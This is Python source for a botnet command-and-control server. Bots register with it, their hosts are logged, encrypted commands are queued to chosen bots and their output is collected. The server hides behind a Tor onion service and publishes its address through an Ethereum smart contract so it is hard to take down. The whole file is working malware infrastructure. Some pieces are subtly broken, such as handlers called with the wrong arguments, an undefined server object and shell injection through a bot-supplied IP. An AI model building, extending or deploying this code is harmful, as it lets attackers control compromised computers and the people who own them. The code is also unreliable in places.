import os
import sys
import socket
import subprocess
import base64
import json
import time
import random
import threading
import platform
import socks
import logging
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from scapy.all import sr, IP, ICMP, TCP, ARP, Ether
from netaddr import IPNetwork, IPAddress
import requests
import stem
import shutil
import getpass
import argparse
import zipfile, io
import urllib.request, ipaddress
import tarfile
import cv2
import psutil
from subprocess import Popen, PIPE
import csv
import csv
import stat
from urllib.parse import urlparse
from flask import Flask, request, jsonify, send_from_directory



CURRENT_DIR = Path(__file__).resolve().parent
PROJECT_ROOT = CURRENT_DIR

BOT_REGISTRY_FILE = PROJECT_ROOT / "Z3R0_Bot_Registry.csv"

if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from Ghost_Comm.update_torsite_html import update_hidden_service_html
from botnet.blockchain_utils import compile_contract, deploy_contract, get_contract_instance, set_c2_url

app = Flask(__name__)

# --- Configuration ---
ENCRYPTION_KEY = b'sixteen byte key'
CONTROL_URL_PATH = Path.home() / "CONTROL-URL"

# --- Logging ---
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(threadName)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('C2')

_control_url_state = {"value": None, "mtime": None}

def save_bot_to_registry(bot_id, bot_ip, os_info):
    with open(BOT_REGISTRY_FILE, 'a', newline='') as csvfile:
        fieldnames = ['bot_id', 'bot_ip', 'os_info', 'timestamp']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

        if csvfile.tell() == 0:  # Write header only if file is empty
            writer.writeheader()

        writer.writerow({
            'bot_id': bot_id,
            'bot_ip': bot_ip,
            'os_info': os_info,
            'timestamp': time.time()
        })
    logger.info(f"Bot {bot_id} registered and saved to {BOT_REGISTRY_FILE}")

def get_registered_bots():
    bots_data = []
    if not BOT_REGISTRY_FILE.exists():
        return bots_data
    with open(BOT_REGISTRY_FILE, 'r', newline='') as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            bots_data.append(row)
    return bots_data

def _sync_control_url_html(onion_url: str) -> None:
    """Ensure the torsite hidden service serves the botnet GUI."""
    if not onion_url:
        logger.debug("No onion URL provided for HTML sync.")
        return

    if update_hidden_service_html is None:
        logger.warning("update_torsite_html module unavailable; cannot sync onion HTML.")
        return

    parsed = urlparse(onion_url if "://" in onion_url else f"http://{onion_url}")
    onion_host = parsed.hostname or parsed.path
    if not onion_host:
        logger.warning("Failed to parse onion host from CONTROL-URL: %s", onion_url)
        return

    GUI_INDEX_HTML = PROJECT_ROOT / "botnet" / "WEB-GUI" / "GUI-index.html"
    if not GUI_INDEX_HTML.is_file():
        logger.warning("GUI index HTML missing at %s; skipping sync.", GUI_INDEX_HTML)
        return

    TORSITE_ROOT = PROJECT_ROOT / "Ghost_Comm" / "NODES" / "torsite"
    if not TORSITE_ROOT.is_dir():
        logger.warning("Torsite root directory missing at %s; cannot sync onion HTML.", TORSITE_ROOT)
        return

    try:
        destination = update_hidden_service_html(
            onion_address=onion_host,
            html_source=GUI_INDEX_HTML,
            torsite_root=TORSITE_ROOT,
            output_name="index.html",
            backup=True,
        )
    except Exception:
        logger.exception("Failed to sync torsite HTML for %s", onion_host)
        return

    logger.info("Synced torsite HTML for %s -> %s", onion_host, destination)

def get_control_url(path: Path = CONTROL_URL_PATH):
    """Return the current control URL, reloading the file when it changes."""
    global _control_url_state

    try:
        stat_result = path.stat()
        mtime = stat_result.st_mtime
    except FileNotFoundError:
        if _control_url_state["value"]:
            logger.warning("CONTROL-URL file missing; retaining last known value.")
        _control_url_state = {"value": None, "mtime": None}
        return None
    except Exception:
        logger.exception("Failed to stat CONTROL-URL file.")
        return _control_url_state["value"]

    if _control_url_state["mtime"] != mtime:
        try:
            url = path.read_text(encoding='utf-8').strip()
            if not url:
                raise ValueError("CONTROL-URL file is empty.")
        except ValueError:
            logger.error("CONTROL-URL file is empty.")
            _control_url_state["value"] = None
            _control_url_state["mtime"] = mtime
            return None
        except Exception:
            logger.exception("Failed to read CONTROL-URL file.")
            return _control_url_state["value"]

        previous = _control_url_state["value"]
        _control_url_state["value"] = url
        _control_url_state["mtime"] = mtime
        if url != previous:
            logger.info(f"Control URL updated to {url}")
            _sync_control_url_html(url)
        else:
            logger.debug("CONTROL-URL file touched but URL unchanged.")

    return _control_url_state["value"]

# Prime the cache so the operator sees the initial state in the logs.
_initial_control_url = get_control_url()
if _initial_control_url:
    logger.info(f"Active control URL set to {_initial_control_url}")
else:
    logger.warning("Control URL is not set; check CONTROL-URL file.")

# --- Bot Management ---
bots = {}
commands = {}

# --- Encryption/Decryption ---
def encrypt_data(data):
    logger.debug(f"Encrypting data of length {len(data)} bytes.")
    try:
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        encrypted_string = iv + ct
        logger.debug(f"Encryption successful. Result length: {len(encrypted_string)}")
        return encrypted_string
    except Exception:
        logger.exception("An unexpected error occurred during data encryption.")
        raise

def decrypt_data(encrypted_data):
    logger.debug(f"Decrypting data of length {len(encrypted_data)} bytes.")
    try:
        iv = base64.b64decode(encrypted_data[:24])
        ct = base64.b64decode(encrypted_data[24:])
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        decrypted_string = pt.decode()
        logger.debug(f"Decryption successful. Result length: {len(decrypted_string)}")
        return decrypted_string
    except Exception:
        logger.exception("An unexpected error occurred during data decryption.")
        raise

# --- API Endpoints ---
@app.route('/api/bot/register', methods=['POST'])
def register_bot():
    encrypted_data = request.data
    decrypted_data = decrypt_data(encrypted_data)
    data = json.loads(decrypted_data)
    bot_id = data.get('id')
    info = data.get('info')
    public_ip = info.get('ip')
    os_info = info.get('os')
    bots[bot_id] = {'info': info, 'last_seen': time.time(), 'public_ip': public_ip, 'status': 'green'}
    save_bot_to_registry(bot_id, public_ip, os_info)
    logger.info(f"Registered new bot: {bot_id} with public IP: {public_ip}")
    response_payload = {'status': 'ok'}
    control_url = get_control_url()
    if control_url:
        response_payload['control_url'] = control_url
    return jsonify(response_payload)

@app.route('/api/registered_bots', methods=['GET'])
def registered_bots():
    return jsonify(get_registered_bots())

@app.route('/api/bot/ping', methods=['POST'])
def ping():
    encrypted_data = request.data
    decrypted_data = decrypt_data(encrypted_data)
    data = json.loads(decrypted_data)
    bot_id = data.get('id')
    if bot_id in bots:
        bots[bot_id]['last_seen'] = time.time()
        logger.info(f"Received ping from bot: {bot_id}")
        response_payload = {'status': 'ok', 'output': 'pong'}
        control_url = get_control_url()
        if control_url:
            response_payload['control_url'] = control_url
        return jsonify(response_payload)
    else:
        logger.warning(f"Received ping from unknown bot: {bot_id}")
        return jsonify({'status': 'error', 'output': 'not registered'})

@app.route('/api/bot/poll/<bot_id>', methods=['GET'])
def poll_commands(bot_id):
    if bot_id in commands and commands[bot_id]:
        command = commands[bot_id].pop(0)
        encrypted_command = encrypt_data(json.dumps(command))
        logger.info(f"Sending command to bot {bot_id}: {command}")
        return encrypted_command
    else:
        response_payload = {'status': 'ok', 'output': 'no commands'}
        control_url = get_control_url()
        if control_url:
            response_payload['control_url'] = control_url
        return jsonify(response_payload)

@app.route('/api/bot/response/<bot_id>', methods=['POST'])
def receive_response(bot_id):
    encrypted_data = request.data
    decrypted_data = decrypt_data(encrypted_data)
    data = json.loads(decrypted_data)
    command_id = data.get('command_id')
    output = data.get('output')
    logger.info(f"Received response from bot {bot_id} for command {command_id}: {output}")
    return jsonify({'status': 'ok'})

@app.route('/api/bot/log/<bot_id>', methods=['POST'])
def receive_log(bot_id):
    log_entry = request.data.decode()
    logger.info(f"[BOT LOG - {bot_id}] {log_entry}")
    return jsonify({'status': 'ok'})

def check_bot_statuses():
    while True:
        for bot_id, bot_data in list(bots.items()):
            if time.time() - bot_data.get('last_seen', 0) > 60:
                # Bot is offline from C2 perspective, check public IP
                if bot_data.get('public_ip'):
                    response = os.system("ping -c 1 " + bot_data['public_ip'])
                    if response == 0:
                        bots[bot_id]['status'] = 'yellow'
                    else:
                        bots[bot_id]['status'] = 'red'
                else:
                    bots[bot_id]['status'] = 'red' # No public IP to check
            else:
                bots[bot_id]['status'] = 'green'
        time.sleep(30)

@app.route('/api/bots')
def get_bots():
    return jsonify(bots)

@app.route('/api/nodes')
def get_nodes():
    control_url = get_control_url()
    if control_url:
        return jsonify([{'onion_url': control_url, 'status': 'green'}])
    else:
            return jsonify([])
@app.route('/api/c2/command', methods=['POST'])
def issue_c2_command():
    data = request.json
    targets = data.get('targets', [])
    command = data.get('command')

    if not targets or not command:
        return jsonify({'status': 'error', 'message': 'Missing targets or command'}), 400

    command_obj = {'type': 'command', 'command': command, 'command_id': random.randint(1000, 9999)}

    for bot_id in targets:
        if bot_id not in commands:
            commands[bot_id] = []
        commands[bot_id].append(command_obj)

    logger.info(f"Issued command '{command}' to bots: {targets}")
    return jsonify({'status': 'ok'})

from web3 import Web3

# --- Blockchain Integration ---
INFURA_PROJECT_ID = "YOUR_INFURA_PROJECT_ID"  # Replace with your Infura project ID
INFURA_URL = f"https://mainnet.infura.io/v3/{INFURA_PROJECT_ID}"
CONTRACT_META_FILE = "botnet/contract_meta.json"

def update_c2_url_on_blockchain(c2_url):
    try:
        with open(CONTRACT_META_FILE, 'r') as f:
            contract_meta = json.load(f)
        w3 = Web3(Web3.HTTPProvider(INFURA_URL))
        contract_instance = get_contract_instance(w3, contract_meta['address'], contract_meta['abi'])
        set_c2_url(contract_instance, w3, c2_url)
        logger.info(f"Successfully updated C2 URL on the blockchain: {c2_url}")
    except FileNotFoundError:
        logger.warning(f"{CONTRACT_META_FILE} not found. Deploying a new contract.")
        with open('botnet/C2UrlRegistry.sol', 'r') as f:
            solidity_source = f.read()
        w3 = Web3(Web3.HTTPProvider(INFURA_URL))
        contract_interface = compile_contract(solidity_source)
        contract_address = deploy_contract(w3, contract_interface)
        logger.info(f"Contract deployed at: {contract_address}")
        with open(CONTRACT_META_FILE, 'w') as f:
            json.dump({
                'address': contract_address,
                'abi': contract_interface['abi']
            }, f)
        contract_instance = get_contract_instance(w3, contract_address, contract_interface['abi'])
        set_c2_url(contract_instance, w3, c2_url)
        logger.info(f"Successfully updated C2 URL on the blockchain: {c2_url}")
    except Exception as e:
        logger.error(f"Error updating C2 URL on the blockchain: {e}")

def handle_client_request(data):
    try:
        request = json.loads(data.decode('utf-8'))
        request_type = request.get('type')

        if request_type == 'register':
            return register_bot(request)
        elif request_type == 'ping':
            return ping(request)
        elif request_type == 'poll':
            return poll_commands(request)
        elif request_type == 'log':
            return receive_log(request)
        else:
            return json.dumps({'status': 'error', 'message': 'Unknown request type'}).encode('utf-8')
    except Exception as e:
        logger.exception(f"An error occurred while handling client request: {e}")
        return json.dumps({'status': 'error', 'message': 'Internal server error'}).encode('utf-8')

def main():
    # Start status checking thread
    status_thread = threading.Thread(target=check_bot_statuses)
    status_thread.daemon = True
    status_thread.start()

    # Ensure torsite HTML matches the current CONTROL-URL at startup
    current_url = get_control_url()
    if current_url:
        _sync_control_url_html(current_url)
        update_c2_url_on_blockchain(current_url)

    # Start the PrimaryNode
    primary_node = primary_node(handle_client_request=handle_client_request)
    primary_node.start_server()

    # Start Flask server
    control_url_for_display = get_control_url()
    if control_url_for_display:
        message = f"C2 server running on http://127.0.0.1:5000 and accessible via onion address: {control_url_for_display}"
        logger.info(message)
        print(f"[*] {message}")
    else:
        logger.warning("No control URL configured; update CONTROL-URL for onion address.")

    app.run(host='0.0.0.0', port=5000)

if __name__ == '__main__':
    main()
